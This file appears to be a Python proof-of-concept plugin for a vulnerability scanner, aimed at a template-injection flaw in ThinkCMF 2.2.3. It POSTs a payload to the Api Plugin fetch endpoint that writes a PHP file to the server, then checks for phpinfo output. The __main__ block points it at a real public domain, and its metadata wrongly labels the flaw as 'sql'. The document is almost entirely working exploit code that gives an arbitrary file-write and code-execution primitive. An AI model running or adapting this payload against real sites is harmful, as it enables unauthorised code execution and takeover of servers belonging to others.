#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'
# https://xz.aliyun.com/t/3529

def info(data):
    info = {
        "name": "thinkcmf 2.2.3 template inject",
        "info": "thinkcmf 2.2.3 template inject",
        "level": "high",
        "type": "sql",
    }
    return info

def prove(data):
    init(data,'thinkcmf')
    if data['base_url']:
        url = data[
                  'base_url'] + "index.php?g=Api&m=Plugin&a=fetch"
        _data = "templateFile=/../../../public/index&prefix=''&content=<php>file_put_contents('bytestforme2.php','<?php phpinfo();')</php>"
        res = curl('post', url,data = _data)
        if res != None and res.status_code == 200:

            res = curl('get', data['base_url'] + "/bytestforme2.php")
            if res != None and res.status_code == 200 and 'php.ini' in res.text:
                data['flag'] = 1
                data['data'].append({"flag": url})
                data['res'].append({"info": url, "key": "thinkcmf 2.2.3 template inject"})
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))